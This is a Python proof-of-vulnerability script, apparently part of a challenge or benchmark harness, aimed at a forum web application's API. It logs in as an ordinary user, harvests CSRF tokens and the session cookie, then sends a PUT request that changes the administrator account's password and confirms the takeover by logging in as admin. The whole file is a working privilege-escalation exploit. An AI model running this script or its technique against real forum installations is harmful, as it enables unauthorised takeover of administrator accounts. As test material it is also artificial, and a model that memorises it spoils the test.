import sys
import os
import signal
import time
from pwn import *

import requests
from datetime import datetime as dt
import socket
import hashlib
import json
from bs4 import BeautifulSoup
import random


def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def getConfig(conn, headers=""):
    address=BASEADDR+'/api/config'
    return conn.get(address, headers=headers)

def doLogin(conn, username, password, headers=""):
    address=BASEADDR+'/api/v3/utilities/login'
    result = conn.post(address, headers=headers, data={'username':username, 'password': password})
    return result

def getHomepage(conn, headers=""):
    address=BASEADDR+'/?loggedin=true'
    result = conn.get(address, headers=headers)
    return result

def getCookie(response):
    rh=json.dumps(response.headers.__dict__['_store'])
    rhj=json.loads(rh)
    sc_rhj=rhj['set-cookie']
    cookie=sc_rhj[1].split(';')[0]
    return cookie

def getCRSFToken(response):
    configJson=json.loads(response.text)
    return configJson['csrf_token']

def getCRSFTokenSoup(response):
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find('input',attrs = {'name':'_csrf'})['value']

def checkResult(response):
    if response.status_code != 200:
        print("Status Code failure", str(response.status_code), flush=True)
        print('[FAILED] POV Failed', flush=True)
        exit(0)

def main():
    global HOST
    global PORT
    global BASEADDR
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + HOST + ' and PORT: ' + str(PORT), flush=True)
    BASEADDR='http://{}:{}'.format(HOST, PORT)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)


    headers={
    'Host': HOST + ' :' + str(PORT),
    'sec-ch-usa': '"Chromium";v="95", ";Not A Brand";v="99"',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'sec-ch-ua-platform': '"Linux"',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': '',
    'Connection': 'close',
    }
    
    username="chess"
    password="chess123"
    newpassword="admin123"
    admin_uid=1
    uid=27
    c_session = requests.Session()

    ## GET FORUM CONFIGURATION
    result=getConfig(c_session, headers)
    print("Get Config:", result.status_code, flush=True)
    checkResult(result)
    headers['x-csrf-token']=getCRSFToken(result)
    ## LOGIN INTO CHESS USER
    result=doLogin(c_session, username, password, headers)
    print("Post Login:",result.status_code, flush=True)
    checkResult(result)
    headers['Cookie']=getCookie(result)
    del headers['x-csrf-token']
    ## GET CHESS USER'S HOMEPAGE
    result=getHomepage(c_session, headers)
    print("Get Homepage:",result.status_code, flush=True)
    checkResult(result)
    headers['x-csrf-token']=getCRSFTokenSoup(result)

    ## CHANGE ADMIN USER'S PASSWORD
    webpage='/api/v3/users/' + str(admin_uid)  + '/password'
    address=BASEADDR+webpage
    result = c_session.put(address, headers=headers, data={'currentPassword':password, 'newPassword': newpassword})
    print("Put Change Password:",result.status_code, flush=True)
    checkResult(result)

    ## VERIFY LOGIN WITH NEW PASSWORD
    result=doLogin(c_session, 'admin', newpassword, headers)
    print("Logging into admin account with modified password:", newpassword, flush=True)
    checkResult(result)
    print('[SUCCESS] POV Succeeded', flush=True)

    c_session.close()


if __name__ == '__main__':
    main()
